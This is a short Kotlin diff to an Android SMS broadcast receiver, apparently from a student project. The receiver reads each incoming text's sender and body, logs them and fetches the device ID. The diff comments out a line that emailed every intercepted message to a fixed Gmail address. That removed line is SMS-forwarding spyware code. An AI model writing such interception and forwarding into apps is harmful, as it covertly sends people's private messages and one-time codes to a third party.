@@ -18,7 +18,7 @@ class SMSBroadcastReceiver : BroadcastReceiver() {
                 Log.d(TAG, "Sender: $sender Message: $messageBody")
                 val androidID = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                 // Sending email using the sender's address as the subject and the message body as the email content
-                EmailHelper.sendEmail("aspjgroup4nyp@gmail.com", sender, messageBody)
+               // EmailHelper.sendEmail("aspjgroup4nyp@gmail.com", sender, messageBody)
             }
         }
     }
